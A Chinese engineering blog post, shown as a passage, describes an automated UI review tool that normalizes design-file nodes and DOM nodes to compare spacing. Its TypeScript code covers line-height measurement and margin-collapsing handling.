                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atom-one-dark">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#abb2bf;background:#282c34}.hljs-comment,.hljs-quote{color:#5c6370;font-style:italic}.hljs-doctag,.hljs-formula,.hljs-keyword{color:#c678dd}.hljs-deletion,.hljs-name,.hljs-section,.hljs-selector-tag,.hljs-subst{color:#e06c75}.hljs-literal{color:#56b6c2}.hljs-addition,.hljs-attribute,.hljs-meta-string,.hljs-regexp,.hljs-string{color:#98c379}.hljs-built_in,.hljs-class .hljs-title{color:#e6c07b}.hljs-attr,.hljs-number,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-pseudo,.hljs-template-variable,.hljs-type,.hljs-variable{color:#d19a66}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-selector-id,.hljs-symbol,.hljs-title{color:#61aeee}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}.hljs-link{text-decoration:underline}</style><h2 data-id="heading-0">转转UI自动化走查方案探索</h2>
<h3 data-id="heading-1">前言</h3>
<p>UI走查是现在转转C端需求开发流程中相当重要的一环，然而UI走查这一环节难以接入自动化流程中，导致其没有如同测试环节一样的冒烟环节（又称测试准入），因此实际走查阶段时，前端的UI交付质量难以在流程上做硬性管控，UI还原度参差不齐，这也就进一步导致了UI走查效率难以把控。经UI侧同学的不完全统计，2025年5-8月期间，共走查需求20个，总耗时33h，平均单个需求耗时1.6h，在需求规模较大的情况下，走查耗时最高时可达3-4小时，走查轮次3次，异常数量30-50个不等，而走查本身耗时并不高，而大部分的时间都耗费在对UI异常问题的标注上。因此，开发一种自动化比对UI设计稿与HTML结构，自动化标注比对结果的工具，能在根本上提升UI还原度，提升UI走查效率。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/47c7038c756c46b49701c9dd507276dc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=giECpVZqMcXhNZXBYaDyiZ6q7dE%3D" alt="走查耗时统计" loading="lazy"/></p>
<h3 data-id="heading-2">方案的调研与选择</h3>
<h4 data-id="heading-3">叠图比对方案</h4>
<p>目前现存的大多数UI走查方案走的都是比对UI设计稿与前端页面截图的方案，此方案虽通用性高，但是结果难以量化，难以与标准化研发流程结合，在前言中我们也说明了，走查的耗时成本在与<strong>异常数据的标注</strong>，而非获取比对结果。因此这种方案显然无法达成目的</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8085f307b3f24c6dabadac76cf8020b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=JNzzVIOcb4c4zgUV%2FErkmH3sUw4%3D" alt="prefect pixel实现效果" loading="lazy"/></p>
<h4 data-id="heading-4">像素比对方案</h4>
<p>像素级的比对方案与叠图比对方案的原理相似，在实现上，叠图方案需要开发者主动判断结果，而像素比对方案则是通过类似于<code>opencv</code>之类的图像处理工具配合类似于<code>scikit-image</code>之类的结构相似度算法进行实现。这种方案虽然能拿到量化的比对数据，以及自动化标注，但是在双方图片的相似度上要求较高，设计稿与UI在文案上有一定的区别都能造成比对的误差，且误差不可控。如果进一步的考虑通过微调、自训练ai模型的方案，则训练、标注的成本也相当高。因此改方案也并非最佳的选择。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9339f48c9c941cd94698fa8087c01c0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=GV1ry9dbfV%2BHmeokgA9lSYjc%2BmI%3D" alt="像素级比对方案结果" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19421e681b4b494f81cfe4d340430ed0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=LlbXhRWYRC10PzF47L8Utj4YVCM%3D" alt="像素级比对方案结果" loading="lazy"/></p>
<h4 data-id="heading-5">基于前端与UI节点的比对方案</h4>
<p>在现在流行的一些前端化UI设计工具（例如Figma、Master Go）中，UI设计稿在底层其实是一个大型的带有嵌套关系的JSON数据结构，而前端的Dom树也是一个带有嵌套关系的数据结构。基于这两点，很容易就想到如果能将双方的节点数据归一化处理成相同的数据结构，那么在节点间间距的精确匹配与比对上，或许会有不错的效果。</p>
<h3 data-id="heading-6">数据结构设计</h3>
<p>既然要归一化处理数据，那么首先需要考虑的就是这个数据结构需要什么。</p>
<p>在上文提到的UI走查情况统计数据中，UI走查出现的问题中，间距问题占比约<strong>95%</strong>，字体相关问题约占<strong>3%</strong>，其余诸如背景色、边框等问题占比共2%，因此在方案前期，首要需要解决的问题就是间距问题。</p>
<p>要检测出间距问题，首先需要找到当前节点的相邻节点，于是我们对相邻节点做出如下定义。</p>
<ol>
<li>
<p>定义当前节点A与另一个节点B之间总共有9种环绕关系，按从左到右从上到下编号分别即为1-9号位置。
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/280faf73cbcf4331806889ae891fa6a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=u5TgvlVwpeKwE79K5CwbAc2V6BU%3D" alt="节点周边的8个位置" loading="lazy"/></p>
</li>
<li>
<p>2、4、6、8号位置中，与当前节点的距离最小的节点，即为当前节点的四个方位的相邻节点</p>
</li>
<li>
<p>所谓上下左右的间距，即为当前节点与各方位上的相邻节点的间距。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/** 相对于当前节点的兄弟节点位置枚举 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">SiblingPosition</span> {
  <span class="hljs-comment">/** 不在任何位置 */</span>
  <span class="hljs-variable constant_">NONE</span> = <span class="hljs-number">0</span>,
  <span class="hljs-comment">/** 左上角 */</span>
  <span class="hljs-variable constant_">TOP_LEFT</span> = <span class="hljs-number">1</span>,
  <span class="hljs-comment">/** 正上方 */</span>
  <span class="hljs-variable constant_">TOP</span> = <span class="hljs-number">2</span>,
  <span class="hljs-comment">/** 右上角 */</span>
  <span class="hljs-variable constant_">TOP_RIGHT</span> = <span class="hljs-number">3</span>,
  <span class="hljs-comment">/** 左侧 */</span>
  <span class="hljs-variable constant_">LEFT</span> = <span class="hljs-number">4</span>,
  <span class="hljs-comment">/** 右侧 */</span>
  <span class="hljs-variable constant_">RIGHT</span> = <span class="hljs-number">6</span>,
  <span class="hljs-comment">/** 左下角 */</span>
  <span class="hljs-variable constant_">BOTTOM_LEFT</span> = <span class="hljs-number">7</span>,
  <span class="hljs-comment">/** 正下方 */</span>
  <span class="hljs-variable constant_">BOTTOM</span> = <span class="hljs-number">8</span>,
  <span class="hljs-comment">/** 右下角 */</span>
  <span class="hljs-variable constant_">BOTTOM_RIGHT</span> = <span class="hljs-number">9</span>,
}
<span class="hljs-comment">/** 节点的唯一ID标识符 */</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UniqueId</span> = <span class="hljs-built_in">string</span>
<span class="hljs-comment">/** 只记录2 4 6 8 四个方向的兄弟节点信息 */</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">SiblingRelativeNodeInfo</span> = <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">SiblingPosition</span>, <span class="hljs-title class_">UniqueId</span>&gt;&gt;
</code></pre>
</li>
</ol>
<p>除此之外，我们还需要该节点的<code>boundingRect</code>、<code>padding</code>、<code>margin</code>、<code>border</code>、<code>font</code>相关的信息，最终设计了如下的数据结构</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/** 节点信息 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">NodeInfo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SiblingRelativeNodeInfo</span> {
  <span class="hljs-comment">/** 父节点 id */</span>
  <span class="hljs-attr">parentId</span>: <span class="hljs-title class_">UniqueId</span>
  <span class="hljs-comment">/** 子节点 id */</span>
  <span class="hljs-attr">children</span>: <span class="hljs-title class_">UniqueId</span>[]
  <span class="hljs-comment">/** 兄弟节点 id */</span>
  <span class="hljs-attr">sibling</span>: <span class="hljs-title class_">UniqueId</span>[]
  <span class="hljs-attr">uniqueId</span>: <span class="hljs-title class_">UniqueId</span>
  <span class="hljs-attr">nodeName</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/** 节点边界 */</span>
  <span class="hljs-attr">boundingRect</span>: <span class="hljs-title class_">BoundingRect</span>
  <span class="hljs-comment">/** padding信息 */</span>
  <span class="hljs-attr">paddingInfo</span>: <span class="hljs-title class_">PaddingInfo</span>
  <span class="hljs-comment">/** border信息 */</span>
  <span class="hljs-attr">borderInfo</span>: <span class="hljs-title class_">BorderInfo</span>
  <span class="hljs-comment">/** 背景色 */</span>
  <span class="hljs-attr">backgroundColor</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/** 标签名称（设计稿则为节点类型） */</span>
  tagName?: <span class="hljs-built_in">string</span> | <span class="hljs-title class_">SceneNode</span>[<span class="hljs-string">'type'</span>]
  <span class="hljs-comment">/** 文本样式信息, 只有内部是文本的节点才有这个字段 */</span>
  textStyleInfo?: <span class="hljs-title class_">TextStyleInfo</span>
  <span class="hljs-comment">/** 节点的中心信息 <span class="hljs-doctag">@description</span> DOM ONLY */</span>
  nodeFlexInfo?: <span class="hljs-title class_">NodeFlexInfo</span>
  <span class="hljs-comment">/** 相邻节点的边距 */</span>
  <span class="hljs-attr">neighborMarginInfo</span>: <span class="hljs-title class_">Partial</span>&lt;<span class="hljs-title class_">Record</span>&lt;<span class="hljs-title class_">SiblingPosition</span>, <span class="hljs-title class_">NeighborMarginInfo</span>&gt;&gt;
}

</code></pre>
<h3 data-id="heading-7">数据归一化处理流程</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart TD
    Start([开始: rootNode]) --&gt; GetBounding[获取根节点 getBoundingClientRect]
    GetBounding --&gt; SetBounding[设置 rootBounding 到 domConfigs]
    SetBounding --&gt; CheckTextResize{检查设计稿是否有&lt;br/&gt;textAutoResize}
    CheckTextResize --&gt; RecordInfo[onDomInfoRecorder&lt;br/&gt;记录 DOM 信息]
    
    RecordInfo --&gt; SyncText[syncTextInfoToTextParentNode&lt;br/&gt;同步文本信息到父节点]
    SyncText --&gt; LargeLineHeight[processLargeLineHeight&lt;br/&gt;处理大行高场景]
    
    LargeLineHeight --&gt; ShouldShrink{是否需要处理&lt;br/&gt;shouldShrinkBounding?}
    ShouldShrink --&gt;|是| ProcessShrink[processDomNodeShouldShrinkBounding&lt;br/&gt;处理收缩边界]
    ShouldShrink --&gt;|否| ProcessZZUI[processDomZZUINode&lt;br/&gt;处理 ZZUI 节点]
    ProcessShrink --&gt; ProcessZZUI
    
    ProcessZZUI --&gt; SearchInitial[searchNeighborNodesInitial&lt;br/&gt;搜索初始邻居节点]
    SearchInitial --&gt; RemoveSame1[removeSameSizePositionChildren&lt;br/&gt;去除同位置同大小子节点 #1]
    
    RemoveSame1 --&gt; MarginCollapse[processMarginCollapsing&lt;br/&gt;处理 margin 折叠]
    MarginCollapse --&gt; Padding[processPaddingInfo&lt;br/&gt;处理 padding 信息]
    Padding --&gt; ShrinkRect[shrinkRectBounding&lt;br/&gt;收缩矩形边界]
    
    ShrinkRect --&gt; RemoveSame2[removeSameSizePositionChildren&lt;br/&gt;去除同位置同大小子节点 #2]
    RemoveSame2 --&gt; Match[recordHybridNodeMatchResult&lt;br/&gt;记录混合节点匹配结果]
    
    Match --&gt; SearchNeighbor[searchNeighborNodes&lt;br/&gt;搜索邻居节点]
    SearchNeighbor --&gt; Distance[getNeighborNodeDistance&lt;br/&gt;计算邻居节点距离]
    
    Distance --&gt; End([返回: FlatNodeMap])
    
    style Start fill:#e1f5e1
    style End fill:#ffe1e1
    style ShouldShrink fill:#fff4e1
    style CheckTextResize fill:#fff4e1
</code></pre>
<p>Dom侧数据处理与UI侧数据处理逻辑基本一致，上图为整个Dom结构数据处理流程，下面将对该流程中比较核心的部分进行讲解。</p>
<h4 data-id="heading-8"><code>processLargeLineHeight</code>处理行高问题</h4>
<p>处理行高问题，旨在抹平前端侧与UI侧在相同渲染效果下，因为设置了不同的行高导致节点高度不同造成的异常。行高数据的归一化处理依赖于节点内部的<code>textStyleInfo</code>，其结构如下</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">TextStyleInfo</span> {
  <span class="hljs-comment">/** 行高 */</span>
  <span class="hljs-attr">lineHeight</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-comment">/** 文本宽度 */</span>
  <span class="hljs-attr">textWidth</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-comment">/** 字体大小 */</span>
  <span class="hljs-attr">fontSize</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-comment">/** 字体粗细 */</span>
	<span class="hljs-attr">fontWeight</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-comment">/** 字体 */</span>
  <span class="hljs-attr">fontFamily</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-comment">/** 文本行数 */</span>
  <span class="hljs-attr">textLineCount</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-comment">/** 文本对齐方向 */</span>
  <span class="hljs-attr">textAlignment</span>: <span class="hljs-title class_">TextAlignment</span>
  <span class="hljs-comment">/** 文本内容 */</span>
  <span class="hljs-attr">textContent</span>: <span class="hljs-built_in">string</span>
	<span class="hljs-comment">/** master go的文本节点的宽高策略 */</span>
  textAutoResize?: <span class="hljs-title class_">TextNode</span>[<span class="hljs-string">'textAutoResize'</span>]
}
</code></pre>
<p>其核心逻辑如下：</p>
<ol>
<li><strong>创建测量容器</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> measureElement = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'div'</span>)
measureElement.<span class="hljs-property">style</span>.<span class="hljs-property">position</span> = <span class="hljs-string">'absolute'</span>
measureElement.<span class="hljs-property">style</span>.<span class="hljs-property">visibility</span> = <span class="hljs-string">'hidden'</span>
</code></pre>
<ol start="2">
<li><strong>克隆关键样式</strong></li>
</ol>
<p>复制影响文本布局的所有样式到测量元素：</p>
<ul>
<li><strong>字体样式</strong>: <code>fontSize</code>, <code>fontFamily</code>, <code>fontWeight</code></li>
<li><strong>排版</strong>: <code>lineHeight</code>, <code>whiteSpace</code>, <code>wordBreak</code>, <code>textTransform</code></li>
<li><strong>约束</strong>: <code>width</code>（使用原节点宽度）</li>
<li><strong>清零</strong>: <code>padding</code>, <code>margin</code>, <code>border</code>（避免干扰）</li>
</ul>
<ol start="3">
<li><strong>首次测量（多行场景）</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript">measureElement.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">`<span class="hljs-subst">${domNode.getBoundingClientRect().width}</span>px`</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(measureElement)
<span class="hljs-keyword">const</span> measureHeight = measureElementRect.<span class="hljs-property">height</span>
</code></pre>
<ul>
<li>设置<strong>固定宽度</strong>（与原节点一致）</li>
<li>测量文本在此宽度约束下的实际高度</li>
</ul>
<ol start="4">
<li><strong>计算行数</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> shouldUseOriginHeight = !isInline &amp;&amp; originHeight &lt; measureHeight
<span class="hljs-keyword">const</span> textHeight = shouldUseOriginHeight ? originHeight : measureHeight
<span class="hljs-keyword">const</span> lineCount = <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">max</span>(<span class="hljs-number">1</span>, <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">round</span>(textHeight / lineHeightValue))
</code></pre>
<p><strong>关键逻辑</strong>：</p>
<ul>
<li>如果原节点是 <strong>block</strong> 且设置了固定高度，且该高度小于测量高度
<ul>
<li>说明文本被裁剪了（如 <code>height: 50px</code> 但文本实际需要 100px）</li>
<li>使用原始高度计算行数（因为实际显示的就是被裁剪的部分）</li>
</ul>
</li>
<li>否则使用测量高度</li>
<li><code>行数 = 文本高度 / 行高</code></li>
</ul>
<ol start="5">
<li><strong>单行特殊处理</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (lineCount &gt; <span class="hljs-number">1</span>) {
  <span class="hljs-keyword">return</span> baseTextStyle
}
<span class="hljs-comment">// 单行场景，重新计算宽度</span>
measureElement.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = <span class="hljs-string">'auto'</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(measureElement)
<span class="hljs-keyword">const</span> measureElementRect2 = measureElement.<span class="hljs-title function_">getBoundingClientRect</span>()
</code></pre>
<p>单行重新测量，根本上是为了确定单行文本的场景下实际占用的最小宽度。</p>
<p>在获取了<code>textStyleInfo</code>之后，就可以进行行高的归一化处理了。</p>
<ol>
<li><strong>Inline 节点特殊处理</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">if</span> (isInlineNode &amp;&amp; !!parentNodeInfo) {
  nodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">y</span> = parentNodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">y</span>
  nodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">height</span> = parentNodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">height</span>
  <span class="hljs-keyword">return</span>
}
</code></pre>
<p>inline节点的处理是一个大坑，在MasterGo的渲染器中，文字始终是在<code>TextNode</code>中居中处理的，但是在前端文本中，文本是以baseline为基准对齐的，文字在lnlineNode中的居中方式，取决于字体本身的设置，而非始终居中渲染。因此此套逻辑只能在非行内元素中使用，而行内元素的宽高则始终与父节点保持一致。</p>
<ol start="2">
<li><strong>单行文本行高大于字体大小的场景处理</strong></li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> realHeight = boundingRect.<span class="hljs-property">height</span> - paddingBottom - paddingTop

<span class="hljs-keyword">if</span> (textLineCount &gt; <span class="hljs-number">1</span> || fontSize === realHeight) {
  <span class="hljs-keyword">return</span>
}

<span class="hljs-keyword">const</span> deltaValue = realHeight - fontSize
nodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">y</span> = boundingRect.<span class="hljs-property">y</span> + deltaValue / <span class="hljs-number">2</span>
nodeInfo.<span class="hljs-property">boundingRect</span>.<span class="hljs-property">height</span> = fontSize + paddingTop + paddingBottom
</code></pre>
<p><strong>调整方式</strong>：</p>
<pre><code class="hljs language-scss" lang="scss">原始高度 = <span class="hljs-number">50px</span> (行高撑开)
字体大小 = <span class="hljs-number">14px</span>
多余空间 = <span class="hljs-number">36px</span>

调整后：
- Y 坐标下移：y + <span class="hljs-number">18px</span> (居中)
- 高度缩小：<span class="hljs-number">14px</span> + <span class="hljs-attribute">padding</span>
</code></pre>
<h4 data-id="heading-9"><code>processMarginCollapsing</code>处理边距合并的场景</h4>
<p>要理解这一步骤，首先需要理解CSS中的核心概念：<strong>Margin 折叠（Margin Collapsing）</strong></p>
<h5 data-id="heading-10">Margin Collapsing介绍</h5>
<p>在特定条件下，<strong>子元素的 margin 会穿透父元素边界</strong>，直接作用到父元素外部。举个例子：</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"background: lightblue;"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 30px; background: pink;"</span>&gt;</span>
    子元素
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
<p><strong>预期效果</strong>：子元素距离父元素顶部 30px<br/>
<strong>实际效果</strong>：父元素整体向下移动 30px，子元素紧贴父元素顶部</p>
<pre><code class="hljs">❌ 预期布局                ✅ 实际布局
┌─────────────┐           ↓ 30px
│  Parent     │           ┌─────────────┐
│  ↓ 30px     │           │  Parent     │
│  ┌────────┐ │           │┌────────┐   │
│  │ Child  │ │           ││ Child  │   │
│  └────────┘ │           │└────────┘   │
└─────────────┘           └─────────────┘
</code></pre>
<h5 data-id="heading-11">不会发生 Margin 折叠的条件：</h5>
<ol>
<li>
<p>BFC区域</p>
</li>
<li>
<p>父节点有边界或者背景</p>
</li>
<li>
<p>Flex、Grid布局</p>
</li>
<li>
<p>节点中有内联文本</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
  内联文本
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"margin-top: 30px;"</span>&gt;</span>子元素<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
</code></pre>
</li>
</ol>
<h5 data-id="heading-12">处理逻辑</h5>
<ol>
<li>判断是否会发生Margin折叠</li>
<li>会发生Margin折叠时，对应方向上是否有子节点有<code>margin</code></li>
<li>有<code>margin</code>时，将子节点设置为<code>margin: 0</code>,并将父节点对应方向上的<code>margin</code>设置为子节点的值与父节点的值中的最大值。</li>
</ol>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">hoistingNotBfcBoundaryMargin</span>(<span class="hljs-params">domNode: HTMLElement</span>) {
  <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(domNode.<span class="hljs-property">children</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">childNode</span>) =&gt;</span> {
    <span class="hljs-comment">// 反向DFS，先走最内部节点，然后往外走</span>
    <span class="hljs-title function_">hoistingNotBfcBoundaryMargin</span>(childNode <span class="hljs-keyword">as</span> <span class="hljs-title class_">HTMLElement</span>)
  })
  <span class="hljs-comment">// 是否是bfc</span>
  <span class="hljs-keyword">const</span> isBFC = <span class="hljs-title function_">getDomIsBfc</span>(domNode)
  <span class="hljs-comment">// 是否是flex or grid</span>
  <span class="hljs-keyword">const</span> isFlexOrGridItem = <span class="hljs-title function_">getIsFlexOrGridItem</span>(domNode)
  <span class="hljs-comment">// 是否有内联元素</span>
  <span class="hljs-keyword">const</span> hasInlineContent = <span class="hljs-title function_">getHasInlineContent</span>(domNode)
  <span class="hljs-comment">// 是否有clear</span>
  <span class="hljs-keyword">const</span> hasClearance = <span class="hljs-title function_">getHasClearance</span>(domNode)
  <span class="hljs-keyword">const</span> childNodeList = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(domNode.<span class="hljs-property">children</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">childNode</span>) =&gt;</span> {
    <span class="hljs-keyword">const</span> isDataTextWrapper = childNode.<span class="hljs-title function_">getAttribute</span>(<span class="hljs-string">'data-text-wrapper'</span>) === <span class="hljs-string">'1'</span>
    <span class="hljs-keyword">return</span> !isDataTextWrapper
  })

  <span class="hljs-comment">// 全部为false才需要提升margin</span>
  <span class="hljs-keyword">const</span> preJudgeResult = [isBFC, isFlexOrGridItem, hasInlineContent, hasClearance, !childNodeList.<span class="hljs-property">length</span>].<span class="hljs-title function_">every</span>(<span class="hljs-function"><span class="hljs-params">it</span> =&gt;</span> !it)
  <span class="hljs-keyword">if</span> (!preJudgeResult) {
    <span class="hljs-keyword">return</span>
  }
  <span class="hljs-keyword">const</span> shouldHoistTopMargin = <span class="hljs-title function_">judgeDomNodeMarginHoisting</span>(domNode, <span class="hljs-string">'top'</span>)
  <span class="hljs-keyword">const</span> shouldHoistBottomMargin = <span class="hljs-title function_">judgeDomNodeMarginHoisting</span>(domNode, <span class="hljs-string">'bottom'</span>)

  <span class="hljs-keyword">if</span> (shouldHoistTopMargin) {
    <span class="hljs-title function_">hostingTargetDirectionMargin</span>(domNode, <span class="hljs-string">'top'</span>)
  }
  <span class="hljs-keyword">if</span> (shouldHoistBottomMargin) {
    <span class="hljs-title function_">hostingTargetDirectionMargin</span>(domNode, <span class="hljs-string">'bottom'</span>)
  }
}
</code></pre>
<h4 data-id="heading-13"><code>processPaddingInfo</code> 合并padding逻辑</h4>
<p>在UI设计稿中，他们的边距可能是两个节点之间的距离，也可能是自动化布局的时候配置的padding。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/62397a9d03f0475b8b1864cde4cd7118~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=Gzi3vLX%2Bwf6z%2Fe4W03m2zFf%2F4q0%3D" alt="不同的边距实现" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73fd3385f9a54921a055458baee215d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6L2s6L2s5oqA5pyv5Zui6Zif:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764297289&amp;x-signature=2oOCKd%2Fomtqcg%2B7IsT3fyoHDpbc%3D" alt="边距场景2" loading="lazy"/></p>
<p>而在前端页面中，由于时常要考虑到节点存在与不存在的情况下的间距稳定性，因此常会出现各种拼接边距的情况。</p>
